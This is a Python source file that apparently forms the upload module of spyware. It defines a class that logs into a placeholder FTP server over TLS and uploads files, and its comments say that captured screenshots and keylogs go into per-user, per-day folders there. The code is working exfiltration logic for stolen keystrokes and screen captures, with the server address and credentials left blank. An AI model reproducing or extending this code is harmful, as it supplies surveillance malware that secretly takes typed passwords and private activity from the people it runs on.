from ftplib import FTP_TLS
from sys import exc_info
from helpers import *
from datetime import date
class FTPs:
    host = # ftp address
    user = # username
    pswd = # password

    def __init__(self,uname,host=host,user=user,password=pswd):
        self.user_dir = uname
        self.host = host
        self.user = user
        self.password = password
    def upload(self,path,type,name=None):
        try:
            fname = name if name else path.split('\\')[-1]
            ftps = FTP_TLS(self.host)
            ftps.login(self.user,self.password)
            ftps.prot_p()
            # force encoding to utf-8, this will let us to work with unicode file names
            ftps.encoding = "utf-8"
            ftps.cwd(self.user_dir)
            ftps.cwd(type)
            if type != 'files':
                # if type of requested file is screenshot or keylog
                # upload it to special folder on ftp
                today = date.today().strftime("%b-%d-%Y")
                if today not in ftps.nlst():
                    ftps.mkd(today)
                ftps.cwd(today)
                ftps.storbinary('STOR %s' % fname, open(path, 'rb'))
                return 'Upload Started!'
            if fname in ftps.nlst():
                return 'File Already on FTP'
            ftps.storbinary('STOR %s' %fname, open(path,'rb'))
            ftps.close()
            return 'Upload Started!'

        except Exception as e:
            if e.args[0] == 0:
                return 'Uploaded to FTP!'
            return 'Upload Failed!'
